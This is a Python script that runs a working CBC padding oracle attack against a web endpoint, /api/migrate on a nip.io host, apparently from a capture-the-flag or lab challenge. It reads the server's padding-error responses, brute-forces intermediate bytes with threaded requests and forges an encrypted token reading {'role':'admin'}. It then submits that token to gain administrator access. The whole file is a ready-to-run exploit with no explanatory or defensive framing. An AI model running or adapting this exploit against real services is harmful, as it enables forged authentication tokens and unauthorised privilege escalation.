import base64, time, requests
from concurrent.futures import ThreadPoolExecutor

HOST= "http://8be374dd-392b-4dfc-a33b-4766cb484fa9.51.79.140.18.nip.io:8080/api/migrate"

S=requests.Session()
S.mount("http://", requests.adapters.HTTPAdapter(pool_connections=16, pool_maxsize=16))

def valid_padding(ct: bytes) -> bool:
    #   500 "invalid padding"          -> padding invalid
    #   400 "profile data is unreadable"  -> padding valid, content bad
    #   200 "Migration successful."       -> padding valid, migrated
    payload={"token": base64.b64encode(ct).decode()}
    for _ in range(8):
        try:
            r=S.post(HOST, json=payload, timeout=30)
        except requests.RequestException:
            time.sleep(1)
            continue
        if r.status_code in (502,503,504):
            time.sleep(1)
            continue
        return "invalid padding" not in r.text
    raise RuntimeError("oracle unreachable after retries")

def recover_intermediate(target: bytes) -> bytearray:
    inter=bytearray(16)
    for pad in range(1, 17):
        pos=16-pad
        def try_guess(g):
            prev=bytearray(16)
            for k in range(pos+1,16):
                prev[k]=inter[k]^pad
            prev[pos]=g
            return valid_padding(bytes(prev)+target)
        
        with ThreadPoolExecutor(max_workers=8) as ex:
            results=list(ex.map(try_guess, range(256)))
        cands=[g for g in range(256) if results[g]]
        if len(cands)==256:
            raise RuntimeError(f"oracle failure at pad={pad}: every guess valid")
        if pad==1 and len(cands)>1:
            real=[]
            for g in cands:
                prev=bytearray(16); prev[pos]=g; prev[pos-1]^=0xff
                if valid_padding(bytes(prev)+target):
                    real.append(g)
            cands=real if real else cands
        g=cands[0]
        inter[pos]=g^pad
        print(f"  byte {pos:2d} -> {g:#04x}", flush=True)
    return inter

def po_encrypt(plaintext: bytes) -> bytes:
    padlen=16-(len(plaintext)%16)
    pt=plaintext+bytes([padlen])*padlen
    blocks=[pt[i:i+16] for i in range(0,len(pt),16)]
    c_next=bytes(16)
    cts=[c_next]
    for pb in reversed(blocks):
        inter=recover_intermediate(c_next)
        c_prev=bytes(a^b for a,b in zip(inter,pb))
        cts.insert(0,c_prev)
        c_next=c_prev
    return b"".join(cts)

pt=('{"role":"admin"}').encode()
ct=po_encrypt(pt)
tok=base64.b64encode(ct).decode()
print("TOKEN:",tok)
r=S.post(HOST, json={"token":tok}, timeout=30)
print("RESP:", r.status_code, r.text)